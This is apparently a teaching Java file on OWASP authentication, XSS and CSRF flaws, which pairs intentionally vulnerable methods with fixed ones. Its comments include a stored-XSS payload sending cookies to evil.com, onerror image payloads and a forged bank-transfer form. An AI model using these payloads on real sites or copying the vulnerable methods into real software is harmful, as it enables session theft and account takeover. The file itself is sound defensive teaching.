package com.bookstore.security;

// =============================================================================
// OWASP VULNERABILITIES: Broken Authentication, XSS, and CSRF
// =============================================================================
//
// This file covers three of the most impactful web vulnerabilities:
//
//  SECTION 1 — Broken Authentication & Session Management (OWASP A07)
//  SECTION 2 — Cross-Site Scripting / XSS (OWASP A03, formerly A07)
//  SECTION 3 — Cross-Site Request Forgery / CSRF
//
// For each vulnerability:
//   - WHY it exists
//   - HOW it is exploited
//   - HOW to prevent it
// =============================================================================

import org.springframework.web.util.HtmlUtils;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import jakarta.servlet.http.HttpSession;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;


// =============================================================================
// SECTION 1: Broken Authentication and Session Management (OWASP A07)
// =============================================================================
// Authentication failures let attackers compromise accounts, steal sessions,
// or bypass login entirely.
//
// Common weaknesses:
//  - Weak or easily guessable passwords (no complexity policy)
//  - Storing passwords in plain text or with weak hashing (MD5, SHA1)
//  - No account lockout after repeated failures (brute-force opportunity)
//  - Session IDs that are predictable, don't expire, or don't invalidate on logout
//  - Continuing to accept the same session ID after login (session fixation)
//  - Transmitting session IDs in URL parameters (appear in logs, referrer headers)
// =============================================================================

class AuthenticationSecurity {

    // -------------------------------------------------------------------------
    // PASSWORD HASHING: Why MD5/SHA1 are insufficient
    // -------------------------------------------------------------------------
    // MD5 and SHA1 are fast hash functions designed for checksums, not passwords.
    // An attacker with a stolen hash can test BILLIONS of passwords per second on a GPU.
    //
    // In 2024, MD5 can be cracked at ~90 billion hashes/second on consumer hardware.
    // The 10,000 most common passwords can be cracked in milliseconds.
    //
    // bcrypt is designed to be SLOW — it has a configurable "cost factor" (work factor).
    // At cost=12: ~250ms per hash check. An attacker can only try ~4 passwords/second.
    // -------------------------------------------------------------------------

    // ❌ VULNERABLE: No hashing — stores plain text
    public static void storePassword_VULNERABLE_PLAINTEXT(String username, String password) {
        // If the database is breached, every password is immediately exposed.
        // Also violates any compliance requirement (PCI-DSS, HIPAA, GDPR).
        String sql = "INSERT INTO users (username, password) VALUES (?, ?)";
        // ... execute sql with (username, password) directly
        System.out.println("VULNERABLE: Stored plain text: " + password);
    }

    // ❌ VULNERABLE: Using MD5 (or SHA-1/SHA-256 without salt)
    public static String hashPassword_VULNERABLE_MD5(String password) throws Exception {
        java.security.MessageDigest md = java.security.MessageDigest.getInstance("MD5");
        byte[] hash = md.digest(password.getBytes());
        return Base64.getEncoder().encodeToString(hash);
        // Problems:
        // 1. MD5 is extremely fast — trivial to brute force
        // 2. No salt — two users with the same password get the same hash
        //    → Rainbow table attacks work perfectly
    }

    // ✅ SECURE: Use BCrypt (provided by Spring Security's BCryptPasswordEncoder)
    //   Spring Security makes this trivial — covered in Part 2 of this walkthrough.
    //
    // BCrypt automatically:
    //   - Generates a random salt (stored inside the hash string)
    //   - Applies the cost factor (default 10, recommended 12 for production)
    //   - Two identical passwords produce DIFFERENT hashes — rainbow tables useless
    //
    // Sample BCrypt hash for "mypassword" at cost=12:
    //   $2a$12$eiMmBXqBFKnJgJyxCFxpMuXaEOBkSYijE3gFbNz8BfX7kJA4KGbCW
    //   ↑↑  ↑↑  ↑ identifier, cost, 22 chars of salt, then 31 chars of hash
    public static void demonstrateBcryptConcept() {
        System.out.println("BCrypt hash format: $2a$<cost>$<22-char-salt><31-char-hash>");
        System.out.println("  $2a  = BCrypt algorithm version");
        System.out.println("  $12  = cost factor (2^12 = 4,096 iterations)");
        System.out.println("  Salt and hash are combined into a single 60-char string");
        System.out.println("  Two calls with identical input produce DIFFERENT hashes (random salt)");
        System.out.println("  BCryptPasswordEncoder.matches() extracts the salt from the stored hash");
        System.out.println("  and re-hashes the attempt to compare — you never decrypt");
    }

    // -------------------------------------------------------------------------
    // ACCOUNT LOCKOUT: Preventing brute-force attacks
    // -------------------------------------------------------------------------
    // Without lockout, attackers can try millions of passwords automatically.
    // With lockout: after N failures within a time window, the account is locked.
    // -------------------------------------------------------------------------

    // Simple in-memory attempt tracker (production would use Redis or database)
    private static final Map<String, Integer> failedAttempts = new ConcurrentHashMap<>();
    private static final Map<String, Long> lockoutTime = new ConcurrentHashMap<>();
    private static final int MAX_ATTEMPTS = 5;
    private static final long LOCKOUT_DURATION_MS = 15 * 60 * 1000L; // 15 minutes

    // ✅ SECURE: Track and enforce lockout
    public static boolean isAccountLocked(String username) {
        Long lockedAt = lockoutTime.get(username);
        if (lockedAt != null) {
            long elapsed = System.currentTimeMillis() - lockedAt;
            if (elapsed < LOCKOUT_DURATION_MS) {
                long remaining = (LOCKOUT_DURATION_MS - elapsed) / 1000 / 60;
                System.out.println("Account '" + username + "' is locked. " +
                    remaining + " minutes remaining.");
                return true;
            } else {
                // Lockout expired — reset
                lockoutTime.remove(username);
                failedAttempts.remove(username);
            }
        }
        return false;
    }

    // ✅ SECURE: Record a failed attempt and lock if threshold exceeded
    public static void recordFailedAttempt(String username) {
        int attempts = failedAttempts.merge(username, 1, Integer::sum);
        System.out.println("Failed attempt #" + attempts + " for user: " + username);

        if (attempts >= MAX_ATTEMPTS) {
            lockoutTime.put(username, System.currentTimeMillis());
            failedAttempts.remove(username);
            System.out.println("Account '" + username + "' LOCKED after " + MAX_ATTEMPTS + " failures");
            // In production: send alert email to user and security team
            // Log the event with IP address for threat detection
        }
    }

    public static void resetFailedAttempts(String username) {
        failedAttempts.remove(username);
    }

    // -------------------------------------------------------------------------
    // SESSION MANAGEMENT: Secure session practices
    // -------------------------------------------------------------------------
    // Session fixation attack:
    //   1. Attacker gets a valid session ID by visiting the login page (or by setting a cookie)
    //   2. Attacker tricks victim into logging in with that same session ID
    //      (e.g., by setting it via URL: /login?JSESSIONID=attacker_known_id)
    //   3. After the victim logs in, the attacker's session ID is now authenticated
    //   4. Attacker sends requests using that session ID — they're logged in as the victim
    //
    // Fix: Invalidate the old session and create a new one IMMEDIATELY after login.
    // Spring Security does this automatically.
    // -------------------------------------------------------------------------

    // ❌ VULNERABLE: Reuses the pre-login session after login
    public static void login_VULNERABLE(HttpServletRequest request, String username) {
        HttpSession session = request.getSession(false); // get existing session
        if (session == null) {
            session = request.getSession(true);
        }
        // ❌ Adding user to EXISTING session — susceptible to session fixation
        session.setAttribute("authenticatedUser", username);
        System.out.println("VULNERABLE: Logged in using existing session ID: " + session.getId());
    }

    // ✅ SECURE: Invalidate old session, create new one, then set authentication
    public static void login_SECURE(HttpServletRequest request, HttpServletResponse response,
                                    String username) {
        HttpSession oldSession = request.getSession(false);
        if (oldSession != null) {
            oldSession.invalidate();  // destroy the pre-login session
        }

        // Create a brand new session with a fresh, server-generated, random session ID
        HttpSession newSession = request.getSession(true);
        newSession.setAttribute("authenticatedUser", username);
        newSession.setMaxInactiveInterval(30 * 60); // expire after 30 minutes of inactivity

        // Also set secure cookie flags (typically handled by server config / Spring Security)
        // HttpOnly: JS cannot read the cookie — prevents XSS stealing the session
        // Secure: cookie only sent over HTTPS
        // SameSite: Strict or Lax — prevents CSRF attacks
        System.out.println("SECURE: New session created after login. ID: " + newSession.getId());
    }

    // -------------------------------------------------------------------------
    // SESSION ID SECURITY: Cookie flags
    // -------------------------------------------------------------------------
    // Configured in application.properties:
    //
    //   server.servlet.session.cookie.http-only=true    ← JS cannot read it (anti-XSS)
    //   server.servlet.session.cookie.secure=true        ← HTTPS only (anti-MITM)
    //   server.servlet.session.cookie.same-site=Strict   ← no cross-site requests (anti-CSRF)
    //   server.servlet.session.timeout=30m               ← expire after 30 min idle
    //
    // NEVER put session IDs in URLs:
    //   ❌ /profile?sessionId=abc123   ← appears in logs, browser history, referrer headers
    //   ✅ Set-Cookie: JSESSIONID=abc123; HttpOnly; Secure; SameSite=Strict
    public static void demonstrateSessionConfig() {
        System.out.println("Key session cookie flags:");
        System.out.println("  HttpOnly  → JavaScript (including XSS payloads) cannot read the cookie");
        System.out.println("  Secure    → Cookie only sent over HTTPS connections");
        System.out.println("  SameSite=Strict → Cookie not sent on cross-origin requests → blocks CSRF");
    }
}


// =============================================================================
// SECTION 2: Cross-Site Scripting (XSS)
// =============================================================================
// XSS occurs when an application includes untrusted data in a web page without
// proper escaping, allowing attackers to inject client-side scripts (JavaScript)
// that execute in a victim's browser.
//
// Three types:
//  STORED XSS    — malicious script is saved in the database, executed whenever
//                  any user views the content
//  REFLECTED XSS — script is included in a URL parameter, executed immediately
//                  when the victim clicks the link (often delivered via phishing)
//  DOM-BASED XSS — script is injected via client-side JavaScript that writes
//                  unsanitized input to the DOM (e.g., document.innerHTML)
//
// What an attacker can do with XSS:
//  - Steal session cookies (document.cookie) → account takeover
//  - Redirect user to a phishing site
//  - Log keystrokes (capture passwords)
//  - Make requests on the user's behalf (CSRF via script)
//  - Deface the website
// =============================================================================

class XssSecurity {

    // -------------------------------------------------------------------------
    // STORED XSS — most dangerous type
    // -------------------------------------------------------------------------
    // Scenario: the bookstore allows customers to leave reviews.
    // The review is stored in the database and displayed on the book page for all visitors.
    // -------------------------------------------------------------------------

    // ❌ VULNERABLE: Review is stored and later rendered without escaping
    public static String renderReview_VULNERABLE(String reviewText) {
        // If reviewText = "<script>document.location='https://evil.com?c='+document.cookie</script>"
        // This gets stored in the database, then rendered in HTML for every visitor.
        // Every visitor's session cookie is sent to evil.com!

        return "<div class='review'>" + reviewText + "</div>";
        //  Output for attack input:
        //  <div class='review'><script>document.location='https://evil.com?c='+document.cookie</script></div>
        //  Browser executes the script — session stolen.
    }

    // ✅ SECURE: HTML-encode the user content before inserting into HTML
    public static String renderReview_SECURE(String reviewText) {
        // HtmlUtils.htmlEscape (Spring) converts special HTML characters to entities:
        //   <  →  &lt;
        //   >  →  &gt;
        //   "  →  &quot;
        //   '  →  &#x27;
        //   &  →  &amp;
        //
        // The browser DISPLAYS the text but does NOT execute it as HTML/JavaScript.

        String escaped = HtmlUtils.htmlEscape(reviewText);
        return "<div class='review'>" + escaped + "</div>";

        //  Attack input: <script>alert('xss')</script>
        //  After escaping: &lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;
        //  Browser renders: <script>alert('xss')</script>  (as visible text, not code)
        //  Script NEVER executes.
    }

    // -------------------------------------------------------------------------
    // REFLECTED XSS — URL parameter example
    // -------------------------------------------------------------------------
    // Scenario: search results page echoes back the search term.
    // Attacker crafts a URL like:
    //   /search?q=<script>steal_session()</script>
    // Then tricks a user into clicking the link (email, phishing page).
    // -------------------------------------------------------------------------

    // ❌ VULNERABLE: Echoes search term back without escaping
    public static String buildSearchPage_VULNERABLE(String searchTerm) {
        // If the user was tricked into visiting:
        //   /search?q=<img src=x onerror=alert(document.cookie)>
        // The response HTML contains the raw img tag — browser executes onerror!

        return "<h1>Results for: " + searchTerm + "</h1>";
    }

    // ✅ SECURE: Always encode output that came from user input
    public static String buildSearchPage_SECURE(String searchTerm) {
        String escaped = HtmlUtils.htmlEscape(searchTerm);
        return "<h1>Results for: " + escaped + "</h1>";

        //  Input: <img src=x onerror=alert(1)>
        //  Output: Results for: &lt;img src=x onerror=alert(1)&gt;
        //  Browser shows: Results for: <img src=x onerror=alert(1)>  (as text)
        //  No script executes.
    }

    // -------------------------------------------------------------------------
    // DOM-BASED XSS — occurs entirely in JavaScript (server sends clean HTML)
    // -------------------------------------------------------------------------
    // The server-side code is correct, but the frontend JavaScript reads from
    // location.hash, location.search, or document.referrer and writes it into
    // the DOM using innerHTML, document.write(), or eval() — never do this!
    // -------------------------------------------------------------------------

    // ❌ VULNERABLE JavaScript (show this as a comment — it's JS, not Java)
    static final String DOM_XSS_VULNERABLE_JS = """
        // ❌ VULNERABLE — reads URL hash and writes directly to innerHTML
        var searchTerm = location.hash.substring(1);
        document.getElementById('output').innerHTML = "You searched for: " + searchTerm;
        // If the URL is: /search#<img src=x onerror=alert(1)>
        // The browser executes the onerror handler!
        """;

    // ✅ SECURE JavaScript — use textContent, not innerHTML
    static final String DOM_XSS_SECURE_JS = """
        // ✅ SECURE — textContent treats value as plain text, never executes it as HTML
        var searchTerm = location.hash.substring(1);
        document.getElementById('output').textContent = "You searched for: " + searchTerm;
        // textContent escapes HTML automatically — the browser displays it as text.
        // Alternatively: create a TextNode and append it instead of using innerHTML.
        """;

    // -------------------------------------------------------------------------
    // Content-Security-Policy header — last line of XSS defense
    // -------------------------------------------------------------------------
    // Even if XSS exists, CSP can block script execution from unexpected sources.
    // Add as a response header (in Spring Security configuration):
    //
    //   Content-Security-Policy: default-src 'self'; script-src 'self' cdn.trusted.com;
    //                            style-src 'self' 'unsafe-inline'; img-src *
    //
    //   default-src 'self'   → only load resources from the same origin
    //   script-src 'self'    → block inline scripts (<script> in HTML) and eval()
    //                          If an XSS payload is injected, CSP blocks its execution
    public static void demonstrateCspConcept() {
        System.out.println("Content-Security-Policy is configured in Spring Security:");
        System.out.println("  http.headers(h -> h.contentSecurityPolicy(c ->");
        System.out.println("      c.policyDirectives(\"default-src 'self'\")");
        System.out.println("  ))");
        System.out.println("This blocks inline scripts even if XSS injection succeeds.");
    }
}


// =============================================================================
// SECTION 3: Cross-Site Request Forgery (CSRF)
// =============================================================================
// CSRF exploits the fact that browsers automatically include cookies (including
// session cookies) with every request to a domain — regardless of where
// the request originated.
//
// Attack flow:
//   1. Alice logs into bankapp.com. Her browser stores a session cookie.
//   2. Alice visits evil.com (still logged in to bankapp.com).
//   3. evil.com's HTML contains:
//        <form action="https://bankapp.com/transfer" method="POST">
//            <input type="hidden" name="amount" value="5000">
//            <input type="hidden" name="to" value="attacker_account">
//        </form>
//        <script>document.forms[0].submit()</script>
//   4. Alice's browser submits the form — WITH HER SESSION COOKIE attached.
//   5. bankapp.com sees a valid session cookie → thinks Alice sent the request.
//   6. Money transferred to attacker. Alice never clicked anything.
//
// The key: the browser automatically sends the session cookie.
// The server can't tell if the POST came from Alice intentionally or from evil.com.
// =============================================================================

class CsrfSecurity {

    // -------------------------------------------------------------------------
    // CSRF Token: The standard defense
    // -------------------------------------------------------------------------
    // The server generates a secret token that:
    //   - Is tied to the user's session
    //   - Is unpredictable (cryptographically random)
    //   - Must be included in every state-changing request (POST, PUT, DELETE)
    //   - Is NOT automatically sent by the browser (unlike cookies)
    //
    // evil.com cannot read the CSRF token from bankapp.com's pages
    // (cross-origin JavaScript cannot read pages from other origins — SOP).
    // So evil.com cannot forge the token → the attack fails.
    // -------------------------------------------------------------------------

    // Simple demonstration of CSRF token generation (Spring Security does this for you)
    private static final Map<String, String> csrfTokenStore = new ConcurrentHashMap<>();

    // ✅ Generate and store a CSRF token for the user's session
    public static String generateCsrfToken(String sessionId) {
        SecureRandom random = new SecureRandom();
        byte[] tokenBytes = new byte[32];
        random.nextBytes(tokenBytes);
        String token = Base64.getUrlEncoder().withoutPadding().encodeToString(tokenBytes);

        csrfTokenStore.put(sessionId, token);
        System.out.println("CSRF token generated for session " + sessionId.substring(0, 8) + "...");
        return token;
        // This token is embedded in every form:
        //   <input type="hidden" name="_csrf" value="TOKEN_VALUE">
        // And in AJAX requests: X-CSRF-TOKEN header
    }

    // ✅ Validate the CSRF token on every state-changing request
    public static boolean validateCsrfToken(String sessionId, String submittedToken) {
        String expectedToken = csrfTokenStore.get(sessionId);

        if (expectedToken == null || submittedToken == null) {
            System.out.println("CSRF validation FAILED: token missing");
            return false;
        }

        // Use MessageDigest.isEqual for constant-time comparison
        // Regular String.equals() is vulnerable to timing attacks
        boolean valid = java.security.MessageDigest.isEqual(
            expectedToken.getBytes(),
            submittedToken.getBytes()
        );

        if (valid) {
            System.out.println("CSRF validation PASSED");
        } else {
            System.out.println("CSRF validation FAILED: token mismatch");
        }
        return valid;
    }

    // -------------------------------------------------------------------------
    // How CSRF tokens appear in HTML forms (Thymeleaf example)
    // -------------------------------------------------------------------------
    static final String THYMELEAF_CSRF_FORM = """
        <!-- Thymeleaf automatically injects the CSRF token when Spring Security is configured -->
        <form action="/api/v1/books/purchase" method="post" th:action="@{/api/v1/books/purchase}">
            <!-- Spring Security / Thymeleaf auto-inserts this hidden field: -->
            <input type="hidden" name="_csrf" th:value="${_csrf.token}">
            <input type="text" name="bookId" placeholder="Book ID">
            <button type="submit">Purchase</button>
        </form>
        
        <!-- For AJAX requests, read the token from the meta tag and set as header -->
        <meta name="_csrf" th:content="${_csrf.token}">
        <meta name="_csrf_header" th:content="${_csrf.headerName}">
        """;

    static final String AJAX_CSRF_EXAMPLE = """
        // JavaScript: send CSRF token as a request header in AJAX calls
        const csrfToken = document.querySelector('meta[name="_csrf"]').getAttribute('content');
        const csrfHeader = document.querySelector('meta[name="_csrf_header"]').getAttribute('content');
        
        fetch('/api/v1/books/purchase', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                [csrfHeader]: csrfToken   // 'X-CSRF-TOKEN': 'token-value'
            },
            body: JSON.stringify({ bookId: 123 })
        });
        // Spring Security validates X-CSRF-TOKEN against the session-stored token.
        // evil.com's malicious form has no way to read or guess this value.
        """;

    // -------------------------------------------------------------------------
    // When to DISABLE CSRF protection (and why this is usually safe for APIs)
    // -------------------------------------------------------------------------
    // CSRF only applies to requests where the browser automatically attaches
    // credentials (cookies, HTTP Basic Auth).
    //
    // REST APIs that use Bearer tokens (JWT in Authorization header) are
    // NOT vulnerable to CSRF because:
    //   - Browsers do NOT automatically include Authorization headers
    //   - Cross-origin JavaScript cannot read the token from another origin
    //   - evil.com has no way to get or attach your Bearer token
    //
    // So: stateless JWT APIs can safely disable CSRF protection.
    // Session-based apps (Thymeleaf, JSP, traditional web apps) MUST keep it on.
    public static void demonstrateCsrfDecision() {
        System.out.println("CSRF decision guide:");
        System.out.println("  Session-based web app (cookies) → KEEP CSRF protection ENABLED");
        System.out.println("  Stateless REST API with JWT Bearer tokens → CAN disable CSRF");
        System.out.println("  Spring Security default: CSRF enabled");
        System.out.println("  To disable for JWT APIs: http.csrf(csrf -> csrf.disable())");
        System.out.println("  Configured in SecurityFilterChain — covered in Part 2.");
    }

    public static void main(String[] args) {
        System.out.println("=== Authentication & Session Security Demo ===");
        AuthenticationSecurity.demonstrateBcryptConcept();
        AuthenticationSecurity.demonstrateSessionConfig();

        System.out.println("\n=== XSS Demo ===");
        String attack = "<script>alert(document.cookie)</script>";
        System.out.println("Attack input: " + attack);
        System.out.println("Vulnerable output: " + XssSecurity.renderReview_VULNERABLE(attack));
        System.out.println("Secure output: " + XssSecurity.renderReview_SECURE(attack));
        XssSecurity.demonstrateCspConcept();

        System.out.println("\n=== CSRF Demo ===");
        String fakeSessionId = UUID.randomUUID().toString();
        String token = CsrfSecurity.generateCsrfToken(fakeSessionId);
        System.out.println("Generated token: " + token.substring(0, 16) + "...");
        System.out.println("Valid token submitted: " + CsrfSecurity.validateCsrfToken(fakeSessionId, token));
        System.out.println("Wrong token submitted: " + CsrfSecurity.validateCsrfToken(fakeSessionId, "hacked"));
        CsrfSecurity.demonstrateCsrfDecision();
    }
}
